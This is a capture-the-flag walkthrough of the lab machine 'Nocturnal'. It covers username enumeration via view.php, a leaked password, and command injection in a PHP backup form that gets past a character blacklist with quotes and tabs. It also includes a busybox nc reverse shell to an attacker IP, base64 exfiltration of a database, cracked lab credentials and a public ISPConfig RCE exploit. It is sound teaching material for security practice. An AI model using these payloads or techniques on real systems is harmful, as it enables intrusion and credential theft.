# Nocturnal: Easy

```sh
sudo vim /etc/hosts
# add nocturnal.htb

nmap -T4 -p- -A -Pn -v nocturnal.htb
```

* open ports & services:

    * 22/tcp: ssh: OpenSSH 8.2p1 Ubuntu 4ubuntu0.12
    * 80/tcp: http: nginx 1.18.0

* checking the webpage, we have Nocturnal: a file management utility: and we have options to register and login

* the website mentions it supports Word, Excel & PDF documents, and there is a dedicated 24/7 support team at 'support@nocturnal.htb'

* web enumeration:

    ```sh
    gobuster dir -u http://nocturnal.htb -w /usr/share/wordlists/dirb/common.txt -x txt,php,html,md -t 25
    # dir scan

    ffuf -c -u 'http://nocturnal.htb' -H 'Host: FUZZ.nocturnal.htb' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 25 -fs 154 -s
    # subdomain scan
    ```

* ```gobuster``` scan finds the following pages:

    * /admin.php
    * /backups
    * /dashboard.php
    * /index.php
    * /login.php
    * /logout.php
    * /register.php
    * /uploads
    * /view.php

* we can register a test account at '/register.php' and login using the creds at '/login.php'

* this leads to the dashboard page at '/dashboard.php', and we have a file upload form available: we can intercept requests in Burp Suite to understand the flow of the webpage

* if we upload a text file for example, we can see a POST request to '/dashboard.php' is made, and then we get an error "Invalid file type. pdf, doc, docx, xls, xlsx, odt are allowed."

* if we check the page '/admin.php' found earlier, it leads to '/login.php'

* checking '/uploads' and '/backups' give the 403 Forbidden error, but from the naming scheme, it seems these directories could store the valid uploads

* if we upload a valid file, like a PDF, we can see the file gets uploaded, and we can view a list of uploads in the same page with timestamps

* clicking on the uploaded file link does a GET request to '/view.php?username=test&file=TestPage.pdf', and it downloads the file

* this shows that we have 2 valid query parameters to test for '/view.php': 'username' and 'file'

* navigating to 'http://nocturnal.htb/view.php' shows the message 'Invalid file extension' for the 'File Viewer' page

* we can try checking this further with ```curl``` - we need to use the session cookie from our login as well:

    ```sh
    curl -b 'PHPSESSID=d90f3h0sqr5ajmch7smifjajl8' 'http://nocturnal.htb/view.php?username=test&file=TestPage.pdf'
    # this shows the file can be accessed

    curl -b 'PHPSESSID=d90f3h0sqr5ajmch7smifjajl8' 'http://nocturnal.htb/view.php?username=test&file=TestPage.php'
    # this gives invalid file extension error

    curl -b 'PHPSESSID=d90f3h0sqr5ajmch7smifjajl8' 'http://nocturnal.htb/view.php?username=notavaliduser&file=TestPage.pdf'
    # if we test with an incorrect username
    # the webpage says 'user not found'

    curl -b 'PHPSESSID=d90f3h0sqr5ajmch7smifjajl8' 'http://nocturnal.htb/view.php?username=admin&file=TestPage.pdf'
    # if we test with an username like 'admin'
    # the webpage says 'file does not exist'
    # and also mentions 'available files for download'

    curl -b 'PHPSESSID=d90f3h0sqr5ajmch7smifjajl8' 'http://nocturnal.htb/view.php?username=test&file=doesnotexist.pdf'
    # for existing user and incorrect filename
    # the webpage says 'file does not exist' and provides links to available files
    ```

* using ```curl```, we can see that '/view.php' can be used to identify a valid username by fuzzing the 'username' parameter, and also shows uploaded files for a valid user if we provide an incorrect filename

* we can try to perform parameter fuzzing for '/view.php' using this information:

    ```sh
    ffuf -b 'PHPSESSID=d90f3h0sqr5ajmch7smifjajl8' -w /usr/share/seclists/Usernames/Names/names.txt -u 'http://nocturnal.htb/view.php?username=FUZZ&file=random.pdf' -fs 2985 -s
    ```

* using ```ffuf```, we are able to find 2 valid usernames: 'amanda' & 'tobias': we can try to see if these users have any uploaded files:

    ```sh
    curl -b 'PHPSESSID=d90f3h0sqr5ajmch7smifjajl8' 'http://nocturnal.htb/view.php?username=amanda&file=doesnotexist.pdf'
    # we get a file

    curl -b 'PHPSESSID=d90f3h0sqr5ajmch7smifjajl8' 'http://nocturnal.htb/view.php?username=tobias&file=doesnotexist.pdf'
    # no available files
    ```

* this shows that a file 'privacy.odt' is uploaded by 'amanda' and we can access it at '/view.php?username=amanda&file=privacy.odt'

* if we navigate to 'http://nocturnal.htb/view.php?username=amanda&file=privacy.odt', we are able to download the ODT file

* we can open this file using LibreOffice, and viewing the file gives us a password 'arHkG7HAI68X8s1J' for the user 'amanda', set by the Nocturnal IT team

* we can try using the creds 'amanda:arHkG7HAI68X8s1J' to login via SSH, but this fails

* however, we can try to login into the Nocturnal webpage at '/login.php', and this works

* the dashboard page for 'amanda' shows a link to the admin panel: indicating that this is an admin user: so we can navigate to '/admin.php' now

* the admin panel shows the file structure of the website: but it shows only PHP files

* the admin panel also has a functionality to create backup: we can enter a password to protect the backup file as well

* we can view the files by clicking on the file: for example, if we try to view 'admin.php', it leads to 'http://nocturnal.htb/admin.php?view=admin.php', which shows the PHP code

* reviewing the PHP files' code gives us the following info:

    * /admin.php: the 'view' parameter to check the PHP files is sanitized; the backup functionality executes multiple commands on the system though

    * /dashboard.php: this shows the SQLite DB relative path as ```../nocturnal_database/nocturnal_database.db```

    * /login.php: shows the passwords are hashed in MD5 format

* checking the 'admin.php' code can give us more info about the webapp logic:

    ```php
    function sanitizeFilePath($filePath) {
        return basename($filePath); // Only gets the base name of the file
    }

    // List only PHP files in a directory
    function listPhpFiles($dir) {
        $files = array_diff(scandir($dir), ['.', '..']);
        echo "<ul class='file-list'>";
        foreach ($files as $file) {
            $sanitizedFile = sanitizeFilePath($file);
            if (is_dir($dir . '/' . $sanitizedFile)) {
                // Recursively call to list files inside directories
                echo "<li class='folder'>📁 <strong>" . htmlspecialchars($sanitizedFile) . "</strong>";
                echo "<ul>";
                listPhpFiles($dir . '/' . $sanitizedFile);
                echo "</ul></li>";
            } else if (pathinfo($sanitizedFile, PATHINFO_EXTENSION) === 'php') {
                // Show only PHP files
                echo "<li class='file'>📄 <a href='admin.php?view=" . urlencode($sanitizedFile) . "'>" . htmlspecialchars($sanitizedFile) . "</a></li>";
            }
        }
        echo "</ul>";
    }

    // View the content of the PHP file if the 'view' option is passed
    if (isset($_GET['view'])) {
        $file = sanitizeFilePath($_GET['view']);
        $filePath = __DIR__ . '/' . $file;
        if (file_exists($filePath) && pathinfo($filePath, PATHINFO_EXTENSION) === 'php') {
            $content = htmlspecialchars(file_get_contents($filePath));
        } else {
            $content = "File not found or invalid path.";
        }
    }

    function cleanEntry($entry) {
        $blacklist_chars = [';', '&', '|', '$', ' ', '`', '{', '}', '&&'];

        foreach ($blacklist_chars as $char) {
            if (strpos($entry, $char) !== false) {
                return false; // Malicious input detected
            }
        }

        return htmlspecialchars($entry, ENT_QUOTES, 'UTF-8');
    }

    <SNIP>

    <body>
        <div class="container">
            <h1>Admin Panel</h1>

            <h2>File Structure (PHP Files Only)</h2>
            <?php listPhpFiles(__DIR__); ?>

            <h2>View File Content</h2>
            <?php if (isset($content)) { ?>
                <pre><?php echo $content; ?></pre>
            <?php } ?>

            <h2>Create Backup</h2>
            <form method="POST">
                <label for="password">Enter Password to Protect Backup:</label>
                <input type="password" name="password" required placeholder="Enter backup password">
                <button type="submit" name="backup">Create Backup</button>
            </form>

            <div class="backup-output">

    <?php
    if (isset($_POST['backup']) && !empty($_POST['password'])) {
        $password = cleanEntry($_POST['password']);
        $backupFile = "backups/backup_" . date('Y-m-d') . ".zip";

        if ($password === false) {
            echo "<div class='error-message'>Error: Try another password.</div>";
        } else {
            $logFile = '/tmp/backup_' . uniqid() . '.log';
        
            $command = "zip -x './backups/*' -r -P " . $password . " " . $backupFile . " .  > " . $logFile . " 2>&1 &";
            
            $descriptor_spec = [
                0 => ["pipe", "r"], // stdin
                1 => ["file", $logFile, "w"], // stdout
                2 => ["file", $logFile, "w"], // stderr
            ];

            $process = proc_open($command, $descriptor_spec, $pipes);
            if (is_resource($process)) {
                proc_close($process);
            }

            sleep(2);

            $logContents = file_get_contents($logFile);
            if (strpos($logContents, 'zip error') === false) {
                echo "<div class='backup-success'>";
                echo "<p>Backup created successfully.</p>";
                echo "<a href='" . htmlspecialchars($backupFile) . "' class='download-button' download>Download Backup</a>";
                echo "<h3>Output:</h3><pre>" . htmlspecialchars($logContents) . "</pre>";
                echo "</div>";
            } else {
                echo "<div class='error-message'>Error creating the backup.</div>";
            }

            unlink($logFile);
        }
    }
    ```

    * the 'sanitizeFilePath()' function removes the directory components and returns the base filename only

    * the 'listPhpFiles($dir)' function scans the directory recursively and prints a list of folders and PHP files; it also generates the link to view the file in the format 'admin.php?view=file'

    * the 'cleanEntry()' function blacklists multiple characters: ';', '&', '|', '$', ' ', '`', '{', '}', '&&': and is used for the password input, to avoid command injection payloads

    * once the password form is submitted, the backup filename is created in the format 'backups/backup_<date>.zip', and a log file is also created in the format '/tmp/backup_<randomid>.log'

    * then, a command is created for the actual archive process; for example: ```zip -x './backups/*' -r -P mypass backups/backup_2026-03-14.zip . > /tmp/backup_x.log 2>&1 &```

    * then the log file contents are also printed for this process; and then the temporary log file is cleared

* we can create a backup by entering a test password; the archive is created and the logs do not show anything interesting, and the zip file contents also contain the same files

* from the PHP code, we can see that the blacklisted characters do not include the double quotes ```"```; also, the command for the zip file creation uses ```"``` in concatenation

* so, we can try to pass ```"``` in the password field, followed by a command

* for example, if we enter the password value ```"whoami``` and submit the form, the log output shows the following message:

    ```sh
    whoami: extra operand 'backups/backup_2026-03-14.zip'
    Try 'whoami --help' for more information.
    quires a value)
    ```

* so command execution is possible with the ```"``` character; we can experiment with a few payloads to get a reverse shell:

    * using the payload ```"whoami```, the command ```whoami``` is executed with the additional parameters like the filename

    * if we add an extra closing double-quote like ```"whoami"```, this executes the ```whoami``` command and we get the output 'www-data'

    * next, to use spaces in the payload, we need to use alternative representations that do not use any of the blacklisted chars like the space char

    * while the space character is blacklisted, the tab character is not blacklisted so we can try using that

    * Googling for [tab character unicode](https://unicode-explorer.com/c/0009) gives the tab character: ```	```

    * we can use this in our payload: for example, using ```"which	nc"```, where the whitespace is tab char, the command is executed and confirms ```nc``` is installed

    * we can build on this technique to get RCE: setup a listener using ```nc -nvlp 4444```

    * now, using tabs in our payload, we can get reverse shell using this payload: ```"busybox	nc	10.10.14.95	4444	-e	sh"```

* in reverse shell:

    ```sh
    id
    # www-data

    # stabilise shell
    python3 -c 'import pty;pty.spawn("/bin/bash")'
    export TERM=xterm
    # Ctrl+Z
    stty raw -echo; fg
    # Enter

    pwd

    ls -la

    ls -la /home
    # we have a user 'tobias'
    # but no read access

    ls -la /var/www
    # check other files in webroot

    ls -la /var/www/nocturnal_database/
    # we have the '.db' file here

    # transfer this file to attacker
    cd /var/www/nocturnal_database/

    md5sum nocturnal_database.db

    cat nocturnal_database.db | base64 -w 0; echo
    # copy the base64 encoded content
    ```

    ```sh
    # on attacker
    echo -n "<base64-content>" | base64 -d > nocturnal.db

    md5sum nocturnal.db

    sqlite3 nocturnal.db

    .tables

    select * from users;
    # dump all data from the users table
    ```

* from the DB used for the website, we are able to retrieve MD5 hashes for multiple users: and this includes the user 'tobias' found on the box

* using [crackstation](https://crackstation.net), we are able to crack 'tobias' user hash to 'slowmotionapocalypse'

* we can now login via SSH:

    ```sh
    ssh tobias@nocturnal.htb

    ls -la

    cat user.txt
    # user flag

    sudo -l
    # cannot run as sudo
    ```

* we can use ```linpeas``` for enumeration: fetch script from attacker:

    ```sh
    wget http://10.10.14.95:8000/linpeas.sh

    chmod +x linpeas.sh

    ./linpeas.sh
    ```

* findings from ```linpeas```:

    * Linux version 5.4.0-212-generic, Ubuntu 20.04.6
    * CVE-2021-3493: Ubuntu OverlayFS shown as exploitable
    * ports 25, 587, 8080 listening locally
    * non-default console user 'ispconfig' mentioned with directory ```/usr/local/ispconfig```
    * unknown SGID binary ```/usr/lib/sm.bin/mailstats```
    * mail apps like ```sendmail``` installed
    * backup files related to ```sendmail``` found

* ports 25 & 587 are for SMTP so we can ignore that for now

* we can look into port 8080 listening on localhost: we can do local port forwarding via SSH to access this service on attacker:

    ```sh
    # create another SSH session
    # port forwarding
    ssh -L 1234:localhost:8080 tobias@nocturnal.htb
    ```

* now we can access this service on attacker port 1234: navigating to this leads to 'http://127.0.0.1:1234/login/'

* the webpage is a login page for ISPConfig, and we have options to login or 'password lost'

* trying default & weak creds like 'admin:admin', 'admin:demo', 'ispconfig:ispconfig' does not work

* we can try using the passwords found earlier for usernames like 'admin', 'tobias', 'amanda'

* the creds 'admin:slowmotionapocalypse' work and we get access to the dashboard

* navigating to the Help section and the About sub-section shows the version 3.2.10p1

* Googling for exploits associated with ISPConfig 3.2.10p1 leads to [CVE-2023-46818: an authenticated RCE exploit](https://pentest-tools.com/vulnerabilities-exploits/ispconfig-php-code-injection_23066)

* we can [attempt this CVE-2023-46818 exploit](https://github.com/ajdumanhug/CVE-2023-46818):

    ```sh
    python3 CVE-2023-46818.py

    python3 CVE-2023-46818.py http://127.0.0.1:1234 admin slowmotionapocalypse
    # this works and we get root shell

    id
    # root

    cat /root/root.txt
    # root flag
    ```
